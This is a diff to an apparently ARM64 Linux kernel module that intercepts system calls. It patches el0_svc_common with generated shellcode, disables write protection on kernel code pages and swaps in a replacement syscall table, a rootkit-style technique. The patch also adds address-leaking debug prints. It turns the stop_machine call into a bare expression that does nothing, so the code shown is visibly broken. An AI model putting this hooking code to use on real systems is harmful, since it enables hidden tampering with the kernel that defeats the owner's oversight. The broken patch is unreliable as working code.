@@ -20,6 +20,7 @@ void el0_svc_common_hook(void) {
           "nop\n\t");
 
     asm volatile("mov x12, #0");
+    pr_info("debug: handler hooked : D\n");
 
     asm volatile("ldr x12, =el0_svc_common_ptr");
     asm volatile("ldr x12, [x12]");
@@ -37,8 +38,8 @@ uint32_t *generate_shellcode(uintptr_t el0_svc_common_hook_addr) {
     code[1] = 0x0;
     code[2] = 0x0;
     code[3] = 0x0;
-    code[4] = cpu_to_le32(0xf940018c); // ldr x12, [x12]
-    code[5] = cpu_to_le32(0xd63f0180); // blr x12
+    // code[4] = cpu_to_le32(0xf940018c); // UNNEEDED, ABSOLUTE ADDRESS, ldr x12, [x12]
+    code[4] = cpu_to_le32(0xd63f0180); // blr x12
     assemble_absolute_load(0b1100, el0_svc_common_hook_addr, code);
 
     // code[0] = cpu_to_le32(0xd503201f); // nop
@@ -62,11 +63,12 @@ int copy_shellcode_sync(void *arg) {
 void hook_el0_svc_common(struct ehh_hook *hook) {
     new_sys_call_table_ptr = hook->new_table;
     el0_svc_common_hook_ptr = &el0_svc_common_hook;
+    pr_info("debug: el0_svc_common_hook_ptr @ %pK\n", el0_svc_common_hook_ptr);
     el0_svc_common_ptr = kallsyms_lookup_name_("el0_svc_common.constprop.0");
 
     pte_flip_write_protect(page_from_virt(el0_svc_common_hook_ptr));
     pte_flip_write_protect(page_from_virt(el0_svc_common_ptr));
     flush_tlb_all();
 
-    stop_machine(copy_shellcode_sync, NULL, NULL);
+    (copy_shellcode_sync, NULL, NULL);
 }
